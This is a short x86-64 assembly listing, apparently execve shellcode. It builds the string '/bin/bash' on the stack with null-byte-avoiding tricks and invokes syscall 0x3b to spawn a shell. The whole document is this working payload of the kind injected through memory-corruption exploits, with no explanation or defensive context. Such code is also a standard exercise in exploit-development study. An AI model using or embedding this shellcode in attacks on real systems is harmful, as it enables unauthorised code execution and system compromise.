section .text
  global _start
    _start:
      xor rdx, rdx
      push rdx
      ;push 'h'
      mov rbx, 'h#######'
      shl rbx, 56
      shr rbx, 56
      push rbx
      mov rax, '/bin/bas'
      push rax
      mov rdi, rsp
      push rdx
      push rdi
      mov rsi, rsp
      xor rax, rax
      mov al, 0x3b
      syscall
